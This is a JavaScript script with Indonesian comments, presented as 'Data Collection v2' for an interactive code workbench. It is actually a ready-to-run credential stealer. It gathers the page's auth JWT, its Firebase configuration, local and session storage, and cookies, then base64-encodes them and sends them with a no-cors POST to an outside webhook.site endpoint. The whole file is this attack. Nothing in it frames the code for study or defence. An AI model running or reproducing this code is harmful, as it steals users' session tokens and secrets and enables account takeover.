/**
 * =================================================================================
 *  Data Collection v2 (Diadaptasi untuk Interactive Workbench)
 * =================================================================================
 * Tujuan:
 * 1. Disesuaikan untuk berjalan di dalam 'Interactive JavaScript Workbench v13+'.
 * 2. Menggunakan objek 'log' dan fungsi 'btoa()' yang tersedia di lingkungan global.
 * 3. Menggunakan metode POST untuk transmisi data.
 * =================================================================================
 */

(async function runDataCollection() {
    // Menggunakan `log` yang disediakan oleh Interactive Workbench
    log.info('Memulai Skrip Pengumpulan Data (v2).');

    // Endpoint untuk analisis data
    const DATA_ENDPOINT = 'https://webhook.site/9a73ca32-1916-4fae-b725-26942a787412';

    try {
        log.info('Mengumpulkan data sisi klien...');
        
        // Mengumpulkan data dari berbagai sumber di browser
        const dataPackage = {
            title: '📦 DATA COLLECTION V2 - WORKBENCH 📦',
            timestamp: new Date().toISOString(),
            origin: window.location.href,
            // Variabel potensial dari aplikasi
            session_jwt: window.__initial_auth_token || 'NOT_FOUND',
            firebase_details: window.__firebase_config || 'NOT_FOUND',
            // Data penyimpanan browser
            local_storage: { ...localStorage },
            session_storage: { ...sessionStorage },
            cookies: document.cookie,
        };
        log.info('Paket data berhasil dibuat.');

        const jsonString = JSON.stringify(dataPackage);
        
        // Menggunakan fungsi btoa() standar browser untuk encoding Base64
        const base64Payload = btoa(unescape(encodeURIComponent(jsonString))); // Penanganan Unicode yang lebih baik
        
        log.info('Mengirim data melalui permintaan Fetch POST...');
        // 'mode: no-cors' memungkinkan pengiriman data tanpa diblokir oleh kebijakan CORS
        fetch(DATA_ENDPOINT, {
            method: 'POST',
            mode: 'no-cors', 
            headers: { 'Content-Type': 'text/plain' },
            body: base64Payload
        });

        // Menggunakan log.success yang tersedia di workbench
        log.success('================================================================');
        log.success('✅ PERMINTAAN DIKIRIM! Proses pengiriman data telah dieksekusi.');
        log.info('Periksa dasbor endpoint Anda untuk melihat data yang masuk.');
        log.success('================================================================');

    } catch (err) {
        log.error(`KESALAHAN SKRIP: ${err.name} - ${err.message}`);
        log.error(err.stack); // Menambahkan stack trace untuk debug yang lebih mudah
    }
})();